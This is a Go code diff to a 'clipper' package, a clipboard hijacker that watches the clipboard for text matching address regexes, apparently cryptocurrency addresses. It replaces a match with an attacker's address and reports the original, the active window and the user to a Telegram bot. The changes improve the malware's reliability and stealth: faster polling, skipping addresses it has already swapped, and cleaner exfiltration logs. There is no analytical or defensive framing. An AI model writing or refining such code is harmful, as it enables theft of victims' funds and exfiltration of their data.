@@ -2,7 +2,6 @@ package clipper
 
 import (
 	"fmt"
-	"os"
 	"regexp"
 	"time"
 
@@ -18,13 +17,12 @@ type Matcher struct {
 }
 
 // main clipper func
-func StartClipper(chat_id string, bot_token string, matchers []Matcher) {
+func StartClipper(chat_id string, bot_token string, matchers []Matcher, user string) {
 	go func() {
 		var lastClipboardContent string
-		hostname, _ := os.Hostname()
 
 		for {
-			time.Sleep(600 * time.Millisecond) // (1000 = 1s)
+			time.Sleep(400 * time.Millisecond) // (1000 = 1s)
 
 			currentContent, err := clipboard.ReadAll()
 			if err != nil {
@@ -38,6 +36,19 @@ func StartClipper(chat_id string, bot_token string, matchers []Matcher) {
 			matched := false
 			for _, matcher := range matchers {
 				if matcher.Regex.MatchString(currentContent) {
+					isAlreadyReplaced := false
+					for _, m := range matchers {
+						if m.Addr == currentContent {
+							isAlreadyReplaced = true
+							break
+						}
+					}
+
+					if isAlreadyReplaced {
+						lastClipboardContent = currentContent
+						continue
+					}
+
 					originalAddr := currentContent
 
 					err = clipboard.WriteAll(matcher.Addr)
@@ -45,14 +56,14 @@ func StartClipper(chat_id string, bot_token string, matchers []Matcher) {
 						continue
 					}
 
-					lastClipboardContent = originalAddr
+					lastClipboardContent = matcher.Addr
 					matched = true
 
 					telegram.SendLog(
 						fmt.Sprintf(
-							"%s | %s\n\n%s → %s",
+							"%s | %s\n\n<code>%s</code> → <code>%s</code>",
 							utils.GetActiveWindow(),
-							hostname,
+							user,
 							originalAddr,
 							matcher.Addr,
 						),
